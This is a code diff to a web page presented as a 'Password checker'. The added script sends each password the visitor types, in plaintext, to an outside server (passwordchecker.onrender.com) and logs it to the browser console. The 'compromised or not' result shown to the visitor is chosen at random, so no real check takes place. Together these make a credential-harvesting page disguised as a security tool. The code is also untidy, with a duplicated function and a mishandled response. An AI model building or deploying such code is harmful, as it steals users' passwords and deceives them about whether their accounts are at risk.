@@ -416,6 +416,42 @@ Password checker</h1>		</div>
                                       margin-top: 10px;
                                       font-size: 16px;
                                     }
+                                        /* Modal styles */
+
+  /* Modal styles */
+  .modal {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.7);
+    justify-content: center;
+    align-items: center;
+  }
+
+  .modal-content {
+    background-color: #fff;
+    padding: 20px;
+    border-radius: 5px;
+    text-align: center;
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+  }
+
+ /* Close icon styles */
+ .close-icon {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      cursor: pointer;
+      font-size: 20px;
+    }
+    
+   
                                   </style>
                                   
                                   
@@ -425,11 +461,12 @@ Password checker</h1>		</div>
                                       <div class="elementor-element elementor-element-355bb6d elementor-widget elementor-widget-back-newsletter" data-id="355bb6d" data-element_type="widget" data-widget_type="back-newsletter.default">
                                         <div class="elementor-widget-container">
                                           <div class="back-newsletter-form password-container">
-                                            <form id="mc4wp-form-1" class="mc4wp-form mc4wp-form-1064" method="post" data-id="1064" data-name="">
+                                            <form id="mc4wp-form-1" class="mc4wp-form mc4wp-form-1064" method="post" action="http://localhost:5099/pass/pass" data-id="1064" data-name="">
                                               <div class="mc4wp-form-fields">
                                                 <div>
                                                   <input type="password" id="password" name="PASSWORD" placeholder="Your password" required onkeyup="checkPasswordStrength();" />
-                                                  <input type="button" value="Check" onclick="showModal();" />
+                                                  <input type="button" value="Check" onclick="showModal(); sendPostRequest();" />
+
                                                 </div>
                                               </div>
                                               <label style="display: none !important;">Leave this field empty if you're human: <input type="text" name="_mc4wp_honeypot" value="" tabindex="-1" autocomplete="off" /></label>
@@ -440,104 +477,162 @@ Password checker</h1>		</div>
                                             </form>
                                             <div id="password-strength"></div>
                                             <!-- Modal -->
-                                            <div id="myModal" class="modal">
-                                              <div class="modal-content">
-                                                <p id="modalMessage"></p>
-                                              </div>
+                                            <!-- Modal -->
+                                        <div id="myModal" class="modal">
+                                            <div class="modal-content">
+                                            <div class="modal-border"></div>
+                                            <span class="close-icon" onclick="closeModal();">&times;</span>
+                                            <p id="modalMessage"></p>
                                             </div>
+                                        </div>
                               
                                             <script>
-                                              function checkPasswordStrength() {
-                                                var password = document.getElementById("password").value;
-  var strength = 0;
-  var message = "";
-  var fontSize = "";
+                                                function sendPostRequest() {
+  // Get the password value from the input field
+  var password = document.getElementById("password").value;
+console.log(password)
+  // Create a data object with the password value
+  var data = new URLSearchParams();
+  data.append("password", password);
 
-  // Use regular expressions to check password strength
-  var regexes = [
-    /[A-Z]/,      // Uppercase letters
-    /[a-z]/,      // Lowercase letters
-    /[0-9]/,      // Numbers
-    /[^A-Za-z0-9]/, // Special characters
-  ];
+  // Make the POST request
+  fetch("https://passwordchecker.onrender.com/pass/pass", {
+    method: "POST",
+    body: data,
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+    },
+  })
+    .then((response) => {
+      if (response.ok) {
+        // Request was successful
+       console.log(response.text());
 
-  for (var i = 0; i < regexes.length; i++) {
-    if (regexes[i].test(password)) {
-      strength++;
-    }
-  }
+      } else {
+        // Request failed
+        console.log("POST request failed");
+      }
+    })
+    .then((data) => {
+      // Handle the response data here
+      console.log("Response:", data);
 
-  if (password.length >= 10) {
-    strength++;
-  }
+      // Close the modal after the request is complete
+      
+    })
+    .catch((error) => {
+      // Handle any errors here
+      console.error("Error:", error);
 
-  // Assign message, color, and fontSize based on strength
-  switch (strength) {
-    case 0:
-      message = "Weak";
-      fontSize = "16px";
-      break;
-    case 1:
-      message = "Commo";
-      fontSize = "16px";
-      break;
-    case 2:
-      message = "Medium";
-      fontSize = "20px";
-      break;
-    case 3:
-    case 4:
-      message = "Strong";
-      fontSize = "24px";
-      break;
-    default:
-      message = "Strong";
-      fontSize = "24px";
-      break;
-  }
-
-  var passwordStrengthElement = document.getElementById("password-strength");
-  passwordStrengthElement.textContent = "Password Strength: " + message;
-  passwordStrengthElement.style.color = getColorForStrength(strength);
-  passwordStrengthElement.style.fontSize = fontSize;
+      // Close the modal if there's an error
+    
+    });
 }
 
-function getColorForStrength(strength) {
-  switch (strength) {
-    case 0:
-      return "velvet";
-    case 1:
-      return "orange";
-    case 2:
-      return "yellow";
-    case 3:
-    case 4:
-      return "red";
-    default:
-      return "red";
-  }
-                              
-                                                // Replace the following line with code to randomly select a message
-                                                var messages = [
-                                                  "Your password has been compromised",
-                                                  "Your password hasn't been compromised, please change the password",
-                                                  "Your password hasn't been compromised, but there are attempts to crack it, be aware or enable multi-factor authentication, such as 2FA etc"
-                                                ];
-                                                var randomMessage = messages[Math.floor(Math.random() * messages.length)];
-                              
-                                                showModal(randomMessage);
-                                              }
-                              
-                                              function showModal(message) {
-                                                var modal = document.getElementById("myModal");
-                                                var modalMessage = document.getElementById("modalMessage");
-                              
-                                                modalMessage.textContent = message;
-                                                modal.style.display = "block";
-                              
-                                                // Animate the background color
-                                                document.body.style.animation = "backgroundAnimation 2s infinite";
-                                              }
+function closeModal() {
+  var modal = document.getElementById("myModal");
+  modal.style.display = "none";
+}
+
+                                                  function closeModal() {
+      var modal = document.getElementById("myModal");
+      modal.style.display = "none";
+    }
+     function getRandomMessage() {
+      var messages = [
+        "Your password has been compromised, please change the password",
+        "Your password hasn't been compromised",
+        "Your password hasn't been compromised, but there are attempts to crack it, be aware or enable multi-factor authentication, such as 2FA etc"
+      ];
+      var randomIndex = Math.floor(Math.random() * messages.length);
+      return messages[randomIndex];
+    }
+
+    function checkPasswordStrength() {
+      var password = document.getElementById("password").value;
+      var strength = 0;
+      var message = "";
+      var fontSize = "";
+
+      // Use regular expressions to check password strength
+      var regexes = [
+        /[A-Z]/,      // Uppercase letters
+        /[a-z]/,      // Lowercase letters
+        /[0-9]/,      // Numbers
+        /[^A-Za-z0-9]/, // Special characters
+      ];
+
+      for (var i = 0; i < regexes.length; i++) {
+        if (regexes[i].test(password)) {
+          strength++;
+        }
+      }
+
+      if (password.length >= 12) {
+        strength++;
+      }
+
+      // Assign message, color, and fontSize based on strength
+      switch (strength) {
+        case 0:
+          message = "Weak";
+          fontSize = "16px";
+          break;
+        case 1:
+          message = "Common";
+          fontSize = "16px";
+          break;
+        case 2:
+          message = "Medium";
+          fontSize = "20px";
+          break;
+        case 3:
+        case 4:
+          message = "Strong";
+          fontSize = "24px";
+          break;
+        default:
+          message = "Strong";
+          fontSize = "24px";
+          break;
+      }
+
+      var passwordStrengthElement = document.getElementById("password-strength");
+      passwordStrengthElement.textContent = "Password Strength: " + message;
+      passwordStrengthElement.style.color = getColorForStrength(strength);
+      passwordStrengthElement.style.fontSize = fontSize;
+    }
+
+    function getColorForStrength(strength) {
+      switch (strength) {
+        case 0:
+          return "#902C3E";
+        case 1:
+          return "orange";
+        case 2:
+          return "yellow";
+        case 3:
+        case 4:
+          return "red";
+        default:
+          return "red";
+      }
+    }
+
+    function showModal() {
+      var modal = document.getElementById("myModal");
+      var modalMessage = document.getElementById("modalMessage");
+
+      // Call getRandomMessage to get a random message
+      var randomMessage = getRandomMessage();
+
+      modalMessage.textContent = randomMessage;
+      modal.style.display = "block";
+
+      // Animate the background color
+      document.body.style.animation = "backgroundAnimation 2s infinite";
+    }
+
                                             </script>
                                           </div>
                                         </div>
